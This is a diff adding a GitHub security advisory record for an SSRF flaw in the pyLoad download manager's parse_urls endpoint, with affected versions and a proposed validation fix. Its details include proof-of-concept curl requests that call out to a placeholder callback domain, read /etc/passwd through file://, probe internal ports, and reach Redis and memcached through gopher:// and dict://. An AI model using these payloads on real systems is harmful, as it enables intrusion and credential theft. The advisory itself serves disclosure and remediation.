@@ -1,0 +1,148 @@
+{
+  "id": "GHSA-2wvg-62qm-gj33",
+  "modified": "2026-04-04T04:31:21.208230Z",
+  "published": "2026-04-04T04:18:43Z",
+  "aliases": [
+    "CVE-2026-35187"
+  ],
+  "summary": "pyLoad: SSRF in parse_urls API endpoint via unvalidated URL parameter",
+  "details": "## Vulnerability Details\n\n**CWE-918**: Server-Side Request Forgery (SSRF)\n\nThe `parse_urls` API function in `src/pyload/core/api/__init__.py` (line 556) fetches arbitrary URLs server-side via `get_url(url)` (pycurl) without any URL validation, protocol restriction, or IP blacklist. An authenticated user with ADD permission can:\n\n- Make HTTP/HTTPS requests to internal network resources and cloud metadata endpoints\n- **Read local files** via `file://` protocol (pycurl reads the file server-side)\n- **Interact with internal services** via `gopher://` and `dict://` protocols\n- **Enumerate file existence** via error-based oracle (error 37 vs empty response)\n\n### Vulnerable Code\n\n**`src/pyload/core/api/__init__.py` (line 556)**:\n\n```python\ndef parse_urls(self, html=None, url=None):\n    if url:\n        page = get_url(url)  # NO protocol restriction, NO URL validation, NO IP blacklist\n        urls.update(RE_URLMATCH.findall(page))\n```\n\nNo validation is applied to the `url` parameter. The underlying pycurl supports `file://`, `gopher://`, `dict://`, and other dangerous protocols by default.\n\n## Steps to Reproduce\n\n### Setup\n\n```bash\ndocker run -d --name pyload -p 8084:8000 linuxserver/pyload-ng:latest\n```\n\nLog in as any user with ADD permission and extract the CSRF token:\n\n```bash\nCSRF=\n```\n\n### PoC 1: Out-of-Band SSRF (HTTP/DNS exfiltration)\n\n```bash\ncurl -s -b \"pyload_session_8000=\u003cSESSION\u003e\"   -H \"X-CSRFToken: \"   -H \"Content-Type: application/x-www-form-urlencoded\"   -d \"url=http://ssrf-proof.\u003cCALLBACK_DOMAIN\u003e/pyload-ssrf-poc\"   http://localhost:8084/api/parse_urls\n```\n\n**Result**: 7 DNS/HTTP interactions received on the callback server (Burp Collaborator). Screenshot attached in comments.\n\n### PoC 2: Local file read via file:// protocol\n\n```bash\n# Reading /etc/passwd (file exists) -\u003e empty response (no error)\ncurl ... -d \"url=file:///etc/passwd\" http://localhost:8084/api/parse_urls\n# Response: {}\n\n# Reading nonexistent file -\u003e pycurl error 37\ncurl ... -d \"url=file:///nonexistent\" http://localhost:8084/api/parse_urls\n# Response: {\"error\": \"(37, \\'Couldn't open file /nonexistent\\')\"}\n```\n\nThe difference confirms pycurl successfully reads local files. While `parse_urls` only returns extracted URLs (not raw content), any URL-like strings in configuration files or environment variables are leaked. The error vs success differential also serves as a **file existence oracle**.\n\nFiles confirmed readable:\n- `/etc/passwd`, `/etc/hosts`\n- `/proc/self/environ` (process environment variables)\n- `/config/settings/pyload.cfg` (pyLoad configuration)\n- `/config/data/pyload.db` (SQLite database)\n\n### PoC 3: Internal port scanning\n\n```bash\ncurl ... -d \"url=http://127.0.0.1:22/\" http://localhost:8084/api/parse_urls\n# Response: pycurl.error: (7, 'Failed to connect to 127.0.0.1 port 22')\n```\n\n### PoC 4: gopher:// and dict:// protocol support\n\n```bash\ncurl ... -d \"url=gopher://127.0.0.1:6379/_INFO\" http://localhost:8084/api/parse_urls\ncurl ... -d \"url=dict://127.0.0.1:11211/stat\" http://localhost:8084/api/parse_urls\n```\n\nBoth protocols are accepted by pycurl, enabling interaction with internal services (Redis, memcached, SMTP, etc.).\n\n## Impact\n\nAn authenticated user with ADD permission can:\n\n- **Read local files** via `file://` protocol (configuration, credentials, database files)\n- **Enumerate file existence** via error-based oracle (`Couldn't open file` vs empty response)\n- **Access cloud metadata endpoints** (AWS IAM credentials at `http://169.254.169.254/`, GCP service tokens)\n- **Scan internal network** services and ports via error-based timing\n- **Interact with internal services** via `gopher://` (Redis RCE, SMTP relay) and `dict://`\n- **Exfiltrate data** via DNS/HTTP to attacker-controlled servers\n\nThe multi-protocol support (`file://`, `gopher://`, `dict://`) combined with local file read capability significantly elevates the impact beyond a standard HTTP-only SSRF.\n\n## Proposed Fix\n\nRestrict allowed protocols and validate target addresses:\n\n```python\nfrom urllib.parse import urlparse\nimport ipaddress\nimport socket\n\ndef _is_safe_url(url):\n    parsed = urlparse(url)\n    if parsed.scheme not in ('http', 'https'):\n        return False\n    hostname = parsed.hostname\n    if not hostname:\n        return False\n    try:\n        for info in socket.getaddrinfo(hostname, None):\n            ip = ipaddress.ip_address(info[4][0])\n            if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:\n                return False\n    except (socket.gaierror, ValueError):\n        return False\n    return True\n\ndef parse_urls(self, html=None, url=None):\n    if url:\n        if not _is_safe_url(url):\n            raise ValueError(\"URL targets a restricted address or uses a disallowed protocol\")\n        page = get_url(url)\n        urls.update(RE_URLMATCH.findall(page))\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pyload-ng",
+        "purl": "pkg:pypi/pyload-ng"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.5.0b3.dev96"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.5.0a5.dev528",
+        "0.5.0a5.dev532",
+        "0.5.0a5.dev535",
+        "0.5.0a5.dev536",
+        "0.5.0a5.dev537",
+        "0.5.0a5.dev539",
+        "0.5.0a5.dev540",
+        "0.5.0a5.dev545",
+        "0.5.0a5.dev562",
+        "0.5.0a5.dev564",
+        "0.5.0a5.dev565",
+        "0.5.0a6.dev570",
+        "0.5.0a6.dev578",
+        "0.5.0a6.dev587",
+        "0.5.0a7.dev596",
+        "0.5.0a8.dev602",
+        "0.5.0a9.dev615",
+        "0.5.0a9.dev629",
+        "0.5.0a9.dev632",
+        "0.5.0a9.dev641",
+        "0.5.0a9.dev643",
+        "0.5.0a9.dev655",
+        "0.5.0a9.dev806",
+        "0.5.0b1.dev1",
+        "0.5.0b1.dev2",
+        "0.5.0b1.dev3",
+        "0.5.0b1.dev4",
+        "0.5.0b1.dev5",
+        "0.5.0b2.dev10",
+        "0.5.0b2.dev11",
+        "0.5.0b2.dev12",
+        "0.5.0b2.dev9",
+        "0.5.0b3.dev13",
+        "0.5.0b3.dev14",
+        "0.5.0b3.dev17",
+        "0.5.0b3.dev18",
+        "0.5.0b3.dev19",
+        "0.5.0b3.dev20",
+        "0.5.0b3.dev21",
+        "0.5.0b3.dev22",
+        "0.5.0b3.dev24",
+        "0.5.0b3.dev26",
+        "0.5.0b3.dev27",
+        "0.5.0b3.dev28",
+        "0.5.0b3.dev29",
+        "0.5.0b3.dev30",
+        "0.5.0b3.dev31",
+        "0.5.0b3.dev32",
+        "0.5.0b3.dev33",
+        "0.5.0b3.dev34",
+        "0.5.0b3.dev35",
+        "0.5.0b3.dev38",
+        "0.5.0b3.dev39",
+        "0.5.0b3.dev40",
+        "0.5.0b3.dev41",
+        "0.5.0b3.dev42",
+        "0.5.0b3.dev43",
+        "0.5.0b3.dev44",
+        "0.5.0b3.dev45",
+        "0.5.0b3.dev46",
+        "0.5.0b3.dev47",
+        "0.5.0b3.dev48",
+        "0.5.0b3.dev49",
+        "0.5.0b3.dev50",
+        "0.5.0b3.dev51",
+        "0.5.0b3.dev52",
+        "0.5.0b3.dev53",
+        "0.5.0b3.dev54",
+        "0.5.0b3.dev57",
+        "0.5.0b3.dev60",
+        "0.5.0b3.dev62",
+        "0.5.0b3.dev64",
+        "0.5.0b3.dev65",
+        "0.5.0b3.dev66",
+        "0.5.0b3.dev67",
+        "0.5.0b3.dev68",
+        "0.5.0b3.dev69",
+        "0.5.0b3.dev70",
+        "0.5.0b3.dev71",
+        "0.5.0b3.dev72",
+        "0.5.0b3.dev73",
+        "0.5.0b3.dev74",
+        "0.5.0b3.dev75",
+        "0.5.0b3.dev76",
+        "0.5.0b3.dev77",
+        "0.5.0b3.dev78",
+        "0.5.0b3.dev79",
+        "0.5.0b3.dev80",
+        "0.5.0b3.dev81",
+        "0.5.0b3.dev82",
+        "0.5.0b3.dev85",
+        "0.5.0b3.dev87",
+        "0.5.0b3.dev88",
+        "0.5.0b3.dev89",
+        "0.5.0b3.dev90",
+        "0.5.0b3.dev91",
+        "0.5.0b3.dev92",
+        "0.5.0b3.dev93",
+        "0.5.0b3.dev94",
+        "0.5.0b3.dev95",
+        "0.5.0b3.dev96"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-2wvg-62qm-gj33/GHSA-2wvg-62qm-gj33.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pyload/pyload/security/advisories/GHSA-2wvg-62qm-gj33"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pyload/pyload"
+    }
+  ]
+}
